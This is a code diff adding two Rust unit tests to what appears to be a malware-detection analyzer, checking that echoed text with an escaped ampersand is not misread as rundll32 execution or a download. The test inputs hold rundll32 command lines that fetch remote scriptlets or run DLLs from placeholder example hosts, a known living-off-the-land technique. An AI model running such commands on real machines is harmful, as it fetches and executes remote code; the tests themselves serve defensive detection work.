@@ -35204,6 +35204,24 @@ rundll32.exe shell32.dll,ShellExec_RunDLL https://rundll32-shell-deob.example/lu
     }
 
     #[test]
+    fn escaped_ampersand_rundll32_download_export_text_does_not_emit_download() {
+        let report = analyze(
+            br#"echo keep ^& rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/echoed.sct"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://rundll32-scrobj-deob.example/echoed.sct"
+            )),
+            "escaped ampersand echo text was misread as rundll32 download export: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_scrobj_downloaded_target_in_deob_text_resolves_url() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::Download {
@@ -35250,6 +35268,23 @@ rundll32.exe shell32.dll,ShellExec_RunDLL https://rundll32-shell-deob.example/lu
             }),
             "glued rundll32 downloaded DLL was not typed: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_glued_rundll32_text_does_not_emit_rundll32_trait() {
+        let report = analyze(
+            br#"echo keep ^& rundll32welnar.nvn,init"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Rundll32 { .. })),
+            "escaped ampersand echo text was misread as glued rundll32 execution: {:?}",
+            report.traits
         );
     }
 
